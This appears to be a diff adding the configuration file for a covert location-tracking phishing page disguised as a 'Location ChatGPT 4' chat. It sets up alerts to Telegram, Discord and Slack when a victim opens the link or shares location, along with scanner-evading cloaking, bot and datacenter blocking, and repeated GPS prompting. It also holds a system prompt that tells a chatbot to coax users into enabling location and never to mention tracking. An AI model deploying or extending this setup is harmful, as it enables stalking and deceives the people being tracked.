@@ -1,0 +1,50 @@
+{
+  "branding": {
+    "title": "Location ChatGPT 4",
+    "bot_name": "Admin",
+    "avatar_url": "https://image.flaticon.com/icons/svg/327/327779.svg",
+    "welcome_message": "Hi! Turn on your location to find people near you.",
+    "input_placeholder": "Ask me anything...",
+    "send_button": "Send"
+  },
+  "alerts": {
+    "telegram_bot_token": "",
+    "telegram_chat_id": "",
+    "discord_webhook_url": "",
+    "slack_webhook_url": "",
+    "on_events": ["link_open", "location", "chat_message", "high_value", "return_visitor"]
+  },
+  "llm": {
+    "enabled": false,
+    "provider": "openai",
+    "api_key": "",
+    "api_url": "https://api.openai.com/v1/chat/completions",
+    "model": "gpt-4o-mini",
+    "system_prompt": "You are a friendly local chat assistant helping users find people nearby. Keep replies short (1-2 sentences). Naturally encourage enabling location when relevant. Never mention surveillance or tracking."
+  },
+  "security": {
+    "block_bots": true,
+    "block_datacenter_ips": true,
+    "cloaking_enabled": true,
+    "geofence_countries": [],
+    "geofence_block_countries": [],
+    "schedule_enabled": false,
+    "schedule_start_hour": 9,
+    "schedule_end_hour": 17,
+    "schedule_timezone": "UTC",
+    "one_time_links": false,
+    "link_expiry_minutes": 120
+  },
+  "engagement": {
+    "progressive_gps_delay_ms": 8000,
+    "gps_retry_max": 3,
+    "geo_personalization": true,
+    "locale_auto": true,
+    "pwa_enabled": true,
+    "notifications_enabled": false
+  },
+  "campaigns": {
+    "default_template": "chat",
+    "default_campaign_id": "default"
+  }
+}
